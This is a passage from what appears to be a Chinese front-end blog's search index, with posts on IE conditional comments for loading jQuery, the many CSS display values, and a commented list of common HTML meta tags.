下面这段是 向下隐藏 语法，必须是IE且版本低于IE9就会加载注释中的内容--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--[if lt IE 9]&gt;</span></span><br><span class="line"><span class="comment">&lt;script src="/jquery-1.9.1.min.js"&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="comment">&lt;![endif]--&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 下面这段是 向下显示 语法，版本高于IE 9或不是IE时就会加载注释内容--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--[if gte IE 9]&gt;&lt;!--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"/jquery-2.0.0.min.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--&lt;![endif]--&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> HTML </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>「 CSS 」display属性居然有这么多</title>
      <link href="/2016/11/28/display/"/>
      <url>/2016/11/28/display/</url>
      
        <content type="html"><![CDATA[<p>思考一个简单的问题，如何用原生js实现元素的显示隐藏，也就是jQuery中show和hide方法。</p><p>你肯定觉得特别简单，隐藏的话，直接<code>el.style.display=&#39;none&#39;;</code></p><p>那显示呢？<code>el.style.display=&#39;block&#39;</code>？<br><a id="more"></a></p><p>display属性是css中最基本的属性。除了常用的<code>inline</code>，<code>inline-block</code>，<code>block</code>，<code>none</code>，其实display还有很多属性值。</p><p>这个属性决定了元素的显示类型，也指定了元素怎么生成盒模型。</p><p>分为外部显示类型和内部显示类型</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* &lt;display-outside&gt; values */</span></span><br><span class="line"><span class="comment">/* 在流式布局中的角色:行内元素还是块级元素 */</span></span><br><span class="line"><span class="selector-tag">display</span>: <span class="selector-tag">block</span>;</span><br><span class="line"><span class="selector-tag">display</span>: <span class="selector-tag">inline</span>;</span><br><span class="line"><span class="selector-tag">display</span>: <span class="selector-tag">run-in</span>; <span class="comment">/* 大多数浏览器都不支持 */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* &lt;display-inside&gt; values */</span></span><br><span class="line"><span class="comment">/* 元素内部内容的格式化上下文的类型 */</span></span><br><span class="line">display: flow; // ??</span><br><span class="line">display: ruby;// ??</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">display</span>: <span class="selector-tag">flow-root</span>;</span><br><span class="line"><span class="selector-tag">display</span>: <span class="selector-tag">table</span>;<span class="comment">/* 内部是table布局 */</span></span><br><span class="line"><span class="selector-tag">display</span>: <span class="selector-tag">flex</span>;<span class="comment">/* 内部是flex布局 */</span></span><br><span class="line"><span class="selector-tag">display</span>: <span class="selector-tag">grid</span>;<span class="comment">/* 内部是grid布局 */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* &lt;display-outside&gt; plus &lt;display-inside&gt; values */</span></span><br><span class="line">display: block flow; // 可以写两个吗？</span><br><span class="line"><span class="selector-tag">display</span>: <span class="selector-tag">inline</span> <span class="selector-tag">table</span>;</span><br><span class="line"><span class="selector-tag">display</span>: <span class="selector-tag">flex</span> <span class="selector-tag">run-in</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* &lt;display-listitem&gt; values */</span></span><br><span class="line"><span class="comment">/* 将这个元素的外部显示类型变为 block，并将内部显示类型变为多个 list-item inline 盒。*/</span></span><br><span class="line"><span class="selector-tag">display</span>: <span class="selector-tag">list-item</span>;</span><br><span class="line"><span class="selector-tag">display</span>: <span class="selector-tag">list-item</span> <span class="selector-tag">block</span>;</span><br><span class="line"><span class="selector-tag">display</span>: <span class="selector-tag">list-item</span> <span class="selector-tag">inline</span>;</span><br><span class="line"><span class="selector-tag">display</span>: <span class="selector-tag">list-item</span> <span class="selector-tag">flow</span>;</span><br><span class="line"><span class="selector-tag">display</span>: <span class="selector-tag">list-item</span> <span class="selector-tag">flow-root</span>;</span><br><span class="line"><span class="selector-tag">display</span>: <span class="selector-tag">list-item</span> <span class="selector-tag">block</span> <span class="selector-tag">flow</span>;</span><br><span class="line"><span class="selector-tag">display</span>: <span class="selector-tag">list-item</span> <span class="selector-tag">block</span> <span class="selector-tag">flow-root</span>;</span><br><span class="line"><span class="selector-tag">display</span>: <span class="selector-tag">flow</span> <span class="selector-tag">list-item</span> <span class="selector-tag">block</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* &lt;display-internal&gt; values */</span></span><br><span class="line"><span class="selector-tag">display</span>: <span class="selector-tag">table-row-group</span>;</span><br><span class="line"><span class="selector-tag">display</span>: <span class="selector-tag">table-header-group</span>;</span><br><span class="line"><span class="selector-tag">display</span>: <span class="selector-tag">table-footer-group</span>;</span><br><span class="line"><span class="selector-tag">display</span>: <span class="selector-tag">table-row</span>;</span><br><span class="line"><span class="selector-tag">display</span>: <span class="selector-tag">table-cell</span>;</span><br><span class="line"><span class="selector-tag">display</span>: <span class="selector-tag">table-column-group</span>;</span><br><span class="line"><span class="selector-tag">display</span>: <span class="selector-tag">table-column</span>;</span><br><span class="line"><span class="selector-tag">display</span>: <span class="selector-tag">table-caption</span>;</span><br><span class="line"><span class="selector-tag">display</span>: <span class="selector-tag">ruby-base</span>;</span><br><span class="line"><span class="selector-tag">display</span>: <span class="selector-tag">ruby-text</span>;</span><br><span class="line"><span class="selector-tag">display</span>: <span class="selector-tag">ruby-base-container</span>;</span><br><span class="line"><span class="selector-tag">display</span>: <span class="selector-tag">ruby-text-container</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* &lt;display-box&gt; values */</span></span><br><span class="line"><span class="comment">/* 是否显示 */</span></span><br><span class="line"><span class="selector-tag">display</span>: <span class="selector-tag">contents</span>;</span><br><span class="line"><span class="selector-tag">display</span>: <span class="selector-tag">none</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* &lt;display-legacy&gt; values */</span></span><br><span class="line"><span class="selector-tag">display</span>: <span class="selector-tag">inline-block</span>;</span><br><span class="line"><span class="selector-tag">display</span>: <span class="selector-tag">inline-table</span>;</span><br><span class="line"><span class="selector-tag">display</span>: <span class="selector-tag">inline-flex</span>;</span><br><span class="line"><span class="selector-tag">display</span>: <span class="selector-tag">inline-grid</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Global values */</span></span><br><span class="line"><span class="selector-tag">display</span>: <span class="selector-tag">inherit</span>;</span><br><span class="line"><span class="selector-tag">display</span>: <span class="selector-tag">initial</span>;</span><br><span class="line"><span class="selector-tag">display</span>: <span class="selector-tag">unset</span>;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> CSS </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>meta全解释</title>
      <link href="/2016/11/18/meta/"/>
      <url>/2016/11/18/meta/</url>
      
        <content type="html"><![CDATA[<p>整理下HTML中常用的meta。<br><a id="more"></a><br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">'x-dns-prefetch-control'</span> <span class="attr">content</span>=<span class="string">'on'</span>/&gt;</span>;</span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"dns-prefetch"</span> <span class="attr">href</span>=<span class="string">"http://bdimg.share.baidu.com"</span> /&gt;</span></span><br></pre></td></tr></table></figure></p><p>dns-prefetch是具有此域名不需要点击就在后台解析，域名解析和内容载入是串行的网络操作</p><p>Chrome内置了DNS Prefetching技术, Firefox 3.5 也引入了这一特性，由于Chrome和Firefox 3.5本身对DNS预解析做了相应优化设置，所以设置DNS预解析的不良影响之一就是可能会降低Google Chrome浏览器及火狐Firefox 3.5浏览器的用户体验。</p><p>SEO作用</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- H5标准声明，使用 HTML5 doctype，不区分大小写 --&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 标准的 lang 属性写法 --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 声明文档使用的字符编码 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 强制浏览器的渲染方式，默认chrome，ie按最最新版本来渲染.chrome=1的意思是chrome frame不改变ie外观就可以使ie里变成chrome --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"X-UA-Compatible"</span> <span class="attr">content</span>=<span class="string">"IE=edge,chrome=1″ /&gt;</span></span></span><br><span class="line"><span class="tag"><span class="string">&lt;!-- 页面描述 --&gt;</span></span></span><br><span class="line"><span class="tag"><span class="string">&lt;meta name="</span> <span class="attr">description</span>" <span class="attr">content</span>=<span class="string">"不超过150个字符"</span> /&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 页面关键词 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"keywords"</span> <span class="attr">content</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 网页作者 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"author"</span> <span class="attr">content</span>=<span class="string">"name, email@gmail.com"</span> /&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 搜索引擎抓取 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"robots"</span> <span class="attr">content</span>=<span class="string">"index,follow"</span> /&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 为移动设备添加 viewport --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"initial-scale=1, maximum-scale=3, minimum-scale=1, user-scalable=no"</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 启用360浏览器的极速模式(webkit) --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"renderer"</span> <span class="attr">content</span>=<span class="string">"webkit"</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 360提出的浏览器内核控制meta标签，页面渲染使用：webkit内核，ie兼容内核，ie标准内核 --&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- &lt;meta name="renderer" content="webkit|ie-comp|ie-stand"&gt; --&gt;</span></span><br><span class="line">  禁止百度转码。百度转码可能会加上广告等，加上了百度也可能不遵守，最好都加上</span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Cache-Control"</span> <span class="attr">content</span>=<span class="string">"no-transform | no-siteapp"</span> /&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- uc强制竖屏 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">" screen-orientation"</span> <span class="attr">content</span>=<span class="string">"portrait"</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- QQ强制竖屏 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"x5-orientation"</span> <span class="attr">content</span>=<span class="string">"portrait"</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- UC强制全屏 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"full-screen"</span> <span class="attr">content</span>=<span class="string">"yes"</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- QQ强制全屏 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"x5-fullscreen"</span> <span class="attr">content</span>=<span class="string">"true"</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 设置页面不缓存 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"expires"</span> <span class="attr">content</span>=<span class="string">"0″&gt;</span></span></span><br><span class="line"><span class="tag"><span class="string">&lt;meta http-equiv="</span> <span class="attr">pragma</span>" <span class="attr">content</span>=<span class="string">"no-cache"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"cache-control"</span> <span class="attr">content</span>=<span class="string">"no-cache"</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 将页面中http升级为https访问 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Security-Policy"</span> <span class="attr">content</span>=<span class="string">"upgrade-insecure-requests"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> HTML </tag>
            
        </tags>
      
    </entry>
    
  
  
</search>
